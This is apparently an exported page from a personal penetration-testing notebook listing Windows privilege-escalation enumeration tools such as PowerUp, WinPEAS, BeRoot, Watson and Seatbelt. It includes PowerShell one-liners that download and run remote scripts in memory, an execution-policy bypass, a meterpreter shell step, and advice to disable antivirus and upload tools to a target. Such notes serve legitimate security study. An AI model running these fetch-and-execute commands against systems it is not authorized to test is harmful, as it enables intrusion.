<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Tools</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Tools</h1><br /><strong>
      <h3>Tools for common privilege escalation misconfigurations</h3>
    </strong><br />• <strong>PowerUp.ps1</strong> from PowerSploit in the PrivEsc category: <a
      href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" target="_blank">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</a><br />
    <span style="color:#a5452a;">execute all checks:</span><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&nbsp;&#39;);Invoke-AllChecks&nbsp;-HTMLReport
      </div>
    </div><br /> OPTIONS:<br /> -HTMLReport → save all results to an HTML file in the actual folder<br /> <a
      href=""><img src="images/1278-1.png" alt="images/1278-1.png" /></a><br /> ◇ to load from shell<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;powershell.exe&nbsp;-exec&nbsp;bypass&nbsp;-Command&nbsp;&quot;&amp;&nbsp;{Import-Module&nbsp;.\PowerUp.ps1;&nbsp;Invoke-AllChecks}&quot;
      </div>
    </div><br /> <a href=""><img src="images/1278-2.png" alt="images/1278-2.png" /></a><br /> <br />•
    <strong>WinPEAS</strong>: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a><br />
    Before running, we need to add a registry key and then reopen the command prompt:<br /> Link raw exe(any): <a
      href="https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    Link bat: <a
      href="https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat" target="_blank">https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;reg&nbsp;add&nbsp;HKCU\Console&nbsp;/v&nbsp;VirtualTerminalLevel&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;1&nbsp;&nbsp;#then&nbsp;restart&nbsp;the&nbsp;command&nbsp;prompt
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;.\winPEASany.exe&nbsp;quiet&nbsp;cmd&nbsp;fast&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Run&nbsp;all&nbsp;checks&nbsp;while&nbsp;avoiding&nbsp;time&nbsp;consuming&nbsp;searches<br />PS&gt;&nbsp;.\winPEASany.exe&nbsp;quiet&nbsp;cmd&nbsp;systeminfo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Run&nbsp;specific&nbsp;check&nbsp;categories
      </div>
    </div><br /> <a href=""><img src="images/1278-3.png" alt="images/1278-3.png" /></a><br /> To run it from
    meterpreter<br />
    <div class="codebox">
      <div class="codebox">meterpreter&gt;&nbsp;shell<br />C:\&gt;&nbsp;winPEAS.bat&nbsp;quiet&nbsp;cmd&nbsp;fast</div>
    </div><br /> <a href=""><img src="images/1278-4.png" alt="images/1278-4.png" /></a><br /><br />•
    <strong>Privesc.ps1</strong>: <a
      href="https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1" target="_blank">https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1</a><strong><br />
    </strong>
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/enjoiz/Privesc/master/privesc.ps1&nbsp;&#39;);Invoke-PrivEsc
      </div>
    </div><br />• <strong>BeRoot</strong>: <a
      href="https://github.com/AlessandroZ/BeRoot" target="_blank">https://github.com/AlessandroZ/BeRoot</a><br /> Available for:<br />
    ◇ Linux and MacOS in <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux" target="_blank">python</a><br /> ◇ Windows
    in<br /> ▪ <a href="https://github.com/AlessandroZ/BeRoot/tree/master/Windows" target="_blank">python</a><br /> ▪ <a
      href="https://github.com/AlessandroZ/BeRoot/releases" target="_blank">Compiled</a><br /> Powershell one-line that use the
    Compiled(.exe) version.We can use it on Powershell 2.0 and newer because use Shell.Application Class<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/AlessandroZ/BeRoot/releases/download/1.0.1/beRoot.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\beRoot.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\beRoot.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\beRoot.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\beRoot.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\beRoot.zip&quot;;
      </div>
    </div><br />•<strong> Watson:</strong> <a
      href="https://github.com/rasta-mouse/Watson" target="_blank">https://github.com/rasta-mouse/Watson</a><br /> Watson is a .NET tool
    designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.<br /> Supported
    Windows Versions<br /> ▪ Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004<br /> ▪ Server 2016
    &amp; 2019<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/DenFox93/Compiled-programs/raw/main/Watson.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\Watson.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\Watson.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Watson.exe&quot;
      </div>
    </div><br /> <a
      href="https://github.com/DenFox93/Compiled-programs/raw/main/Watson.exe" target="_blank">https://github.com/DenFox93/Compiled-programs/raw/main/Watson.exe</a><br />
    <span style="text-decoration:underline;">How to Compile</span>:<br /> <strong>Compile Watson</strong><br /> 1)
    Download the zip file from the Github page<br /> 2) Open the SLN file (structure file used for organizing projects)
    with Microsoft Visual Studio<br /> <a href=""><img src="images/1278-5.png" alt="images/1278-5.png" /></a><br /> 3)
    Turn off AV and Compile Watson by clicking on the Start button of Visual Studio<br /> <a href=""><img
        src="images/1278-6.png" alt="images/1278-6.png" /></a><br /> Watson.exe will be created in the folder
    ..Watson-master\Watson\bin\Debug\<br /> 4) Upload Watson.exe on the target machine. <a
      href="https://github.com/DenFox93/Compiled-programs" target="_blank">Here you can find a compiled version in date
      31/01/2021</a><br /> <a href=""><img src="images/1278-7.png" alt="images/1278-7.png" /></a><br /> <a href=""><img
        src="images/1278-8.png" alt="images/1278-8.png" /></a><br />• Nishang: <a
      href="https://github.com/samratashok/nishang" target="_blank">https://github.com/samratashok/nishang</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1&#39;);get-information
      </div>
    </div><br /><br /><strong>
      <h3>Tools that provides informations for further investigations</h3>
    </strong><br />Tools that does not actively hunt for privilege escalation misconfigurations, but provides related
    information for further investigation.<br /><strong>• Seatbelt</strong><br /> ◇ Code: <a
      href="https://github.com/GhostPack/Seatbelt" target="_blank">https://github.com/GhostPack/Seatbelt</a><br /> ◇ Pre-Compiled: <a
      href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe" target="_blank">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe</a><br />
    <div class="codebox">
      <div class="codebox">PS&gt;&nbsp;.\Seatbelt.exe</div>
    </div><br /> <a href=""><img src="images/1278-9.png" alt="images/1278-9.png" /></a><br /><strong>•
      Accesschk</strong>: <a
      href="https://download.sysinternals.com/files/AccessChk.zip" target="_blank">https://download.sysinternals.com/files/AccessChk.zip</a><br />
    You can use it to check whether a user or group has access to files, directories, services, and registry keys.<br />
    ◇ <span style="text-decoration:underline;">GUI:</span> more recent versions of the program spawn a GUI “accept EULA”
    popup window. So we can use them only via GUI<br /> ◇ <span style="text-decoration:underline;">command line:</span>
    older version of accesschk can be used with the command line, which still has an /accepteula command line
    option.<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-uwdq&nbsp;C:\&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> in the example above we have executed an Accesschk.exe command to check for write permissions in C:\
    but we can use it also for more other things<br /> <br /><br />
  </div>
</body>

</html>